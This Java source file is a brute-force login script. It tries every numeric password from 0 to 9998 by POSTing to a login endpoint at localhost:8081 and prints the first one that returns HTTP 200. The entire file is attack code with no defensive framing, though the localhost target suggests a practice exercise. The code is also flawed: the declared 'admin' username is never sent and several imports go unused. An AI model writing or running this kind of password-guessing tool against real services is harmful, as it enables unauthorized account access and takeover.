package org.example;

import com.fasterxml.jackson.databind.ObjectMapper;
import org.apache.tomcat.util.json.JSONParser;
import org.example.domain.User;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class BruteForce {

    String api = "http://localhost:8081/users/login";

    String user = "admin";
    int iterations = 9999;

    private void Program(){
        for (int password = 0; password < iterations; password++) {
            String formatPassword = String.valueOf(password);

            if(apiRequest(formatPassword)){
                System.out.println("Password: " + password);
                break;
            }
        }
    }

    private boolean apiRequest(String password){

        try {

            HttpURLConnection con = (HttpURLConnection) new URL(api).openConnection();
            con.setRequestMethod("POST");
            String requestData = "password=" + password;

            try(OutputStream os = con.getOutputStream()) {
                byte[] input = requestData.getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);
            }
            return con.getResponseCode() == 200;
        }catch (Exception e){
            e.printStackTrace();
        }
        return false;
    }

    
    public static void main(String[] args) {
        BruteForce bruteForce = new BruteForce();
        bruteForce.Program();
    }
}